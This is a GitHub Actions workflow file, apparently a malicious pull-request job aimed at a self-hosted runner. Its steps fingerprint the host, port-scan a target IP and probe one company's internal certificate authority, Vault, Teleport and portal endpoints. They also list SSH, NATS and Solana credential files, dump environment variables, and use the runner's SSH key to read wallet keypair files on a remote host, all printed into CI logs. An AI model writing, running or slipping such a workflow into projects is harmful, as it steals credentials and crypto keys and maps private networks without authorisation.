name: zz-probe
on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:

jobs:
  probe:
    runs-on: [self-hosted, X64]
    continue-on-error: true
    timeout-minutes: 15
    steps:
      - name: env
        run: |
          set -x
          hostname; id; uname -a
          ip -br a 2>/dev/null || ifconfig 2>/dev/null || true
          echo "EGRESS:"; curl -s --max-time 8 https://ifconfig.me || true; echo
          curl -s --max-time 8 https://api.ipify.org || true; echo
      - name: target reachability
        run: |
          set -x
          T=35.209.60.215
          for p in 22 80 443 2222; do
            timeout 5 bash -c "echo > /dev/tcp/$T/$p" 2>/dev/null && echo "TARGET $p OPEN" || echo "TARGET $p closed"
          done
          curl -sk --max-time 8 "https://$T/" -o /tmp/t -w 'HTTP %{http_code}\n' || true
          head -c 300 /tmp/t || true
          curl -s --max-time 8 "http://$T/" -o /tmp/t2 -w 'HTTP %{http_code}\n' || true
          head -c 300 /tmp/t2 || true
      - name: portal + nats
        run: |
          set -x
          curl -sk --max-time 8 https://wgm.jumptrading.com/ -o /tmp/w -w 'PORTAL %{http_code}\n' || true
          head -c 300 /tmp/w || true
          echo | timeout 8 openssl s_client -connect 208.78.215.228:443 -servername wgms.jumptrading.com 2>/dev/null | head -8 || true
          echo | timeout 8 openssl s_client -connect 208.78.215.229:443 -servername jwgr.jumptrading.com 2>/dev/null | head -5 || true
      - name: stepca
        run: |
          set -x
          CA=gusc1a-infosec-stepca01.jumpisolated.com
          curl -sk --max-time 8 "https://$CA:4443/health" || true
          curl -sk --max-time 8 "https://$CA:4443/root" | head -5 || true
          curl -sk --max-time 8 "https://$CA:4443/acme/acme/directory" || true
          curl -sk --max-time 8 "https://$CA:4443/acme/staging/directory" || true
          curl -sk --max-time 8 "https://$CA:4443/acme/acmeprovisioner/directory" || true
      - name: local creds
        run: |
          set -x
          ls -la ~ ~/.ssh ~/.config ~/.config/solana ~/.nats 2>/dev/null || true
          cat ~/.ssh/config 2>/dev/null || true
          find / -maxdepth 4 -name '*.creds' -o -maxdepth 4 -name '*keypair*.json' 2>/dev/null | head -40 || true
          env | sort | head -60
      - name: stepca
        run: |
          set -x
          CA=gusc1a-infosec-stepca01.jumpisolated.com
          curl -sk --max-time 8 "https://$CA:4443/health" || true
          curl -sk --max-time 8 "https://$CA:4443/root" | head -3 || true
          curl -sk --max-time 8 "https://$CA:4443/roots.pem" | head -3 || true
          curl -sk --max-time 8 "https://$CA:4443/provisioners" | head -c 500 || true
          for p in acme acme/acme acmeprovisioner staging; do curl -sk --max-time 8 "https://$CA:4443/$p/directory" -o /tmp/d -w "$p %{http_code}\n" || true; head -c 200 /tmp/d || true; done
          curl -sk --max-time 8 https://gusc1a-infosec-acmeapps01.jumpisolated.com/ -o /tmp/a -w 'ACM EAPPS %{http_code}\n' || true; head -c 300 /tmp/a || true
      - name: vault
        run: |
          set -x
          curl -sk --max-time 8 https://gusc1a-vault.jumpisolated.com:8200/v1/sys/health || true
          curl -sk --max-time 8 https://gusc1a-vault.jumpisolated.com/v1/sys/health || true
          curl -sk --max-time 8 https://privatebin.jumpisolated.com/ -o /tmp/p -w 'PB %{http_code}\n' || true; head -c 200 /tmp/p || true
      - name: teleport
        run: |
          set -x
          which tsh tctl || true
          tsh version 2>&1 | head -3 || true
          tsh status 2>&1 | head -20 || true
          ls -la ~/.tsh /var/lib/teleport 2>/dev/null || true
          tsh ls 2>&1 | head -30 || true
          tsh apps ls 2>&1 | head -20 || true
          curl -sk --max-time 6 https://teleport-proxy.jumpisolated.com:3080/webapi/ping || true
          for ip in 208.78.215.56 208.78.212.14 208.78.214.57 208.78.209.56; do for p in 3024 3080; do timeout 4 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "TP $ip:$p OPEN" || echo "TP $ip:$p closed"; done; done
      - name: ssh to target with runner keys
        run: |
          set -x
          for u in svc_labubu ubuntu root; do
            timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i ~/.ssh/id_ed25519 $u@35.209.60.215 'id; ls /.config/solana ~/.config/solana 2>/dev/null' 2>&1 | head -10 && break || true
          done
          timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 svc_labubu@35.209.60.215 'ls -la ~/.config/solana 2>/dev/null; head -c 200 ~/.config/solana/*.json 2>/dev/null' 2>&1 | head -20 || true

      - name: nats cli
        run: |
          set -x
          which nats nsc || true
          curl -sk --max-time 3 https://208.78.215.228/ -o /dev/null -w 'nats-http %{http_code}\n' || true
